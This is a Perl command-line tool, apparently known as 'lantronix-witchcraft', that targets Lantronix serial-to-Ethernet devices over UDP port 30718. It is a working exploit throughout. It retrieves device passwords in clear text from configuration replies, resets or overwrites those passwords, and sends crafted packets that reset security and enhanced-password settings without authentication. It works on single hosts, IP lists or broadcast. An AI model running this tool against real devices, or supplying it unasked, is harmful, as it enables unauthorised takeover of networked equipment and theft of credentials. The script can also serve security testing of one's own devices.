#!/usr/bin/perl

use strict;
use IO::Socket;
use Getopt::Long;
my @charset;

my $configfile="$ENV{HOME}/.lantronix-witchcraft";
my %config;
$config{'verbose'}=0;
$config{'port'}=30718;
my $pktcount=0;

if (-e $configfile) {
	open(CONFIG,"<$configfile") or next;
	while (<CONFIG>) {
	    chomp;                  # no newline
	    s/#.*//;                # no comments
	    s/^\s+//;               # no leading white
	    s/\s+$//;               # no trailing white
	    next unless length;     # anything left?
	    my ($var, $value) = split(/\s*=\s*/, $_, 2);
	    $config{$var} = $value;
	} 
	close(CONFIG);
}

Getopt::Long::Configure ("bundling");

my $result = GetOptions (
	"D|dumplog" => \$config{'dumplog'},
	"Q|query" => \$config{'query'},
	"G|getsetup" => \$config{'getsetup'},
	"P|getpass" => \$config{'getpass'},
	"R|resetpass" => \$config{'resetpass'},
	"C|rcr" => \$config{'rcr'},
	"E|resetenh" => \$config{'resetenh'},
	"F|setpass=s" => \$config{'setpass'},
	"S|resetsecurity" => \$config{'resetsecurity'},
	"Y|dry" => \$config{'dry'},
	"b|broadcast" => \$config{'broadcast'},
	"t|time" => \$config{'timestamp'},
	"I|ipfile=s" => \$config{'ipfile'},
	"i|ip=s" => \$config{'ip'},
	"p|port=i" => \$config{'port'},
	"v|verbose+"  => \$config{'verbose'},
	"h|help" => \&help
);

my @iplist;

if ($config{'dry'}) {
	print STDERR "[i] This is dry run.\n";
}

# take IP from -i 
if ($config{'ip'}) {
	push @iplist, $config{'ip'};
}

# take IPs from file
if ($config{'ipfile'}) {
	print STDERR "[i] Using IP file: $config{'ipfile'}\n";
	open (INPUT,"<$config{'ipfile'}") or die("Error opening file $config{'ipfile'} for reading: $!");
	while (<INPUT>) {
		chomp;
		push @iplist, $_;	
	}
	close (INPUT);
}

# take IPs from command line
while (my $cmdip=shift) {
	push @iplist, $cmdip;
}

# length should be 4 
if ($config{'setpass'}) {
	if (length($config{'setpass'})!=4) {
		die ("password size should be 4");
	}
}

my $loop = 1;
my $tries = 0;
$SIG{INT} = \&ctrlc;
print STDERR "[i] Guessing.\n" if ($config{'verbose'}>0);
my $starttime=time();


foreach my $ip (@iplist) {
	# main stuff
	my $configrec;
	print STDERR "[i] $ip - performing\n" if ($config{'verbose'}>0);

	if ($config{'rcr'}) {
		my $resp=send_udp($ip,"\x00\x00\x00\xF4",32);
		warn ("invalid length received: ".length($resp)." : ".hexify($resp)) if (length($resp)!=32); 
		#my @bytes=unpack("C*",$resp);
		my $ver=substr($resp,16,16);
		my $verstr=unpack "Z*", $ver;
		print "Version: $verstr\n";
	}

	if ($config{'query'}) {
		my $resp=send_udp($ip,"\x00\x00\x00\xF6",30);
		warn ("invalid length received: ".length($resp)." : ".hexify($resp)) if (length($resp)!=30); 
		#my @bytes=unpack("C*",$resp);
		my $type=substr($resp,8,3);
		my $mac=substr($resp,24,6);
		print "Type: $type with Mac: ".hexify($mac)."\n";
	}

	if ($config{'getpass'} or $config{'resetpass'} or $config{'setpass'}) {
		my $resp=send_udp($ip,"\x00\x00\x00\xF8",124);
		warn ("invalid length received: ".length($resp)." : ".hexify($resp)) if (length($resp)!=124); 
		if (substr($resp,0,4) eq "\x00\x00\x00\xF9") {
			print "$ip: got correct answer for getconfig\n";
		} else {
			print "$ip: did not get correct answer for getconfig: ".hexify($resp)."\n";
		}
		$configrec=$resp;
		# my @bytes=unpack("C*",$resp);
		my $pass=substr $resp,12,4;
		my $ipaddr=substr $resp,4,4;
		my $subnet=substr $resp,10,1;
		my $gateway=substr $resp,16,4;
		#my $ripaddr=substr $resp,28,4;
		if ($pass eq "\x00\x00\x00\x00") {
			print "$ip: password is not set\n";
		} else {
			print "$ip: Password is: ".un2printable($pass)." (".hexify($pass).")\n";
		}
		print "$ip: IP is: ".char2ip($ipaddr)." (".hexify($ipaddr).") with subnet ".hexify($subnet)."\n";
		#print "$ip: Remote IP is: ".char2ip($ripaddr)." (".hexify($ripaddr).")\n";
		print "$ip: Gateway is: ".char2ip($gateway)." (".hexify($gateway).")\n";
	}

	if ($config{'getsetup'}) {
		my @srec=("\xE0","\xE1","\xE2","\xE3","\xE4","\xE5","\xE6","\xE7","\xE8",
			"\xE9","\xEA","\xEB","\xEC","\xED","\xEE","\xEF");
		foreach my $rec (@srec) {
			print STDERR "[i] $ip - get setup for $rec\n" if ($config{'verbose'}>1);
			my $resp=send_udp($ip,"\x00\x00\x00".$rec,124);
			warn ("invalid length received: ".length($resp)." : ".hexify($resp)) if (length($resp)!=124); 
			if (substr($resp,0,3) eq "\x00\x00\x00") {
				print "$ip: got correct answer for get setup record\n";
			} else {
				print "$ip: did not get correct answer for get setup record: ".hexify($resp)."\n";
			}
			print "Got: ".hexify($resp)."\n";
		}
	}

	if ($config{'resetpass'}) {
		my $setconfigrec=$configrec;
		substr $setconfigrec,0,4,"\x00\x00\x00\xFA";
		substr $setconfigrec,12,4,"\x00\x00\x00\x00"; 
		my $resp=send_udp($ip,$setconfigrec,4);
		warn ("$ip: invalid length received: ".length($resp)." : ".hexify($resp)) if (length($resp)!=4);
		if ($resp eq "\x00\x00\x00\xFB") {
			print "$ip: Successfull password reset.\n";
		} else {
			print "$ip: Did not get proper response for reset.\n";
		}
	}

	if ($config{'setpass'}) {
		my $setconfigrec=$configrec;
		substr $setconfigrec,0,4,"\x00\x00\x00\xFA";
		substr $setconfigrec,12,4,$config{'setpass'}; 
		my $resp=send_udp($ip,$setconfigrec,4);
		warn ("$ip: invalid length received: ".length($resp)." : ".hexify($resp)) if (length($resp)!=4);
		if ($resp eq "\x00\x00\x00\xFB") {
			print "$ip: Successfull password set to $config{'setpass'}.\n";
		} else {
			print "$ip: Did not get proper response for reset.\n";
		}
	}

	if ($config{'resetsecurity'}) {
		my $resetsec="\x00\x00\x00\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x75\x62\x6c\x69\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
		my $resp=send_udp($ip,$resetsec,4);
		print "problem!\n" if ($resp == undef);
		warn ("$ip: invalid length received: ".length($resp)." : ".hexify($resp)) if (length($resp)!=4);
		print "$ip: Return for security reset: ".hexify($resp)."\n";
		if ($resp eq "\x00\x00\x00\xB1") {
			print "$ip: Successfull security reset.\n";
		} else {
			print "$ip: Did not get proper response for reset: ".hexify($resp)."\n";
		}
	}

	if ($config{'resetenh'}) {
		my $resetsec="\x00\x00\x00\xc1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x75\x62\x6c\x69\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
		my $resp=send_udp($ip,$resetsec,4);
		print "problem!\n" if ($resp == undef);
		warn ("$ip: invalid length received: ".length($resp)." : ".hexify($resp)) if (length($resp)!=4);
		print "$ip: Return for security reset: ".hexify($resp)."\n";
		if ($resp eq "\x00\x00\x00\xB1") {
			print "$ip: Successfull security reset.\n";
		} else {
			print "$ip: Did not get proper response for reset: ".hexify($resp)."\n";
		}
	}

	$tries++;

}

my $endtime = time();
my $difftime = $endtime - $starttime;

print STDERR "\n" if ($config{'verbose'}>0);;
print STDERR "[i] Statistics: $tries tries in $difftime seconds.\n" if ($config{'verbose'}>0);;
print STDERR "[i] END of guessing\n" if ($config{'verbose'}>0);;

$SIG{'INT'} = 'DEFAULT';

sub send_udp {
	my ($ip,$content,$respsize) = @_;
	my $port=$config{'port'};
	my $rand=int(rand(65535));
	my $srand=sprintf "%05d",$rand;
	$pktcount++;
	my $spktcount=sprintf "%05d",$pktcount;
	print STDERR "[v] Connecting to $ip:$port\n" if ($config{'verbose'}>6);
	my $socket = IO::Socket::INET->new( PeerPort  => $port,
					 PeerAddr  => $ip,
					 Timeout => 90,
					 Type      => SOCK_DGRAM,
					 Broadcast => $config{'broadcast'},
					 Proto     => 'udp');
	print STDERR "[v] Sending ".length($content)." bytes: \n".hexdump($content)."\n" if ($config{'verbose'}>8);
	if ($config{'dumplog'}) {
		my $fn="dump-$ip-$port-".getstampstr()."-$spktcount-$srand-req.bin";
		open(OUT,">$fn") or warn "cannot open dump file for writting: $!";
		binmode(OUT);
		syswrite(OUT,$content);
		close(OUT);
	}
	$socket->send($content) or die "UDP Client send: $!\n"; 

	my $ret;
	eval
	{
	   local $SIG{ALRM} = sub {die "No response from server!\n"};
	   alarm 5;
	   $socket->recv($ret, $respsize);
	   alarm 0;
	   1;    #  Value for eval code block on normal exit.
	} or return undef;

	if ($config{'dumplog'}) {
		my $fn="dump-$ip-$port-".getstampstr()."-$spktcount-$srand-res.bin";
		open(OUT,">$fn") or warn "cannot open dump file for writting: $!";
		binmode(OUT);
		syswrite(OUT,$ret);
		close(OUT);
	}
	print STDERR "[v] Received ".length($ret)." bytes:\n".hexdump($ret)."\n" if ($config{'verbose'}>8);
	return $ret;
}

sub send_77fe {
	my ($ip,$content,$respsize) = @_;
	my $bla=send_udp ($ip,$content,$respsize);
	return $bla;
}


sub ctrlc {
	$SIG{INT} = \&ctrlc;
	print "\nCTRL+C presssed, stopping.\n";
	$loop=0;
}

sub help {
	# TODO	
}

sub hexdump {
    my $offset = 0;
    my(@array,$format);
    my $retstr;
    foreach my $data (unpack("a16"x(length($_[0])/16)."a*",$_[0])) {
        my($len)=length($data);
        if ($len == 16) {
            @array = unpack('N4', $data);
            $format="0x%08x (%05d)   %08x %08x %08x %08x   %s\n";
        } else {
            @array = unpack('C*', $data);
            $_ = sprintf "%2.2x", $_ for @array;
            push(@array, '  ') while $len++ < 16;
            $format="0x%08x (%05d)" .
               "   %s%s%s%s %s%s%s%s %s%s%s%s %s%s%s%s   %s\n";
        } 
        $data =~ tr/\0-\37\177-\377/./;
        my $tmpstr = sprintf $format,$offset,$offset,@array,$data;
	$retstr=$retstr.$tmpstr;
        $offset += 16;
    }
	return $retstr;
}

sub hexify {
	my ($parm) = @_;
	return unpack("H*",$parm);
}	

sub un2printable {
	my ($parm) = @_;
	$parm =~ s/.*[^[:print:]]+/./;	
	return $parm;
}

sub char2ip {
	my ($parm) = @_;
	my @ipnums=unpack("C4",$parm);
	my $ret = join ('.',@ipnums);	
	return $ret;	
}

sub getstampstr {
	my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) =
            localtime(time);
	$year += 1900;
	$mon +=1;
	# my $str=sprintf "%04d-%02d-%02d-%02d-%02d-%02d-%05d-%d",$year,$mon,$mday,$hour,$min,$sec,int(rand(65535)),time;
	my $str=sprintf "%04d-%02d-%02d-%02d-%02d-%02d",$year,$mon,$mday,$hour,$min,$sec;
	return $str;
}
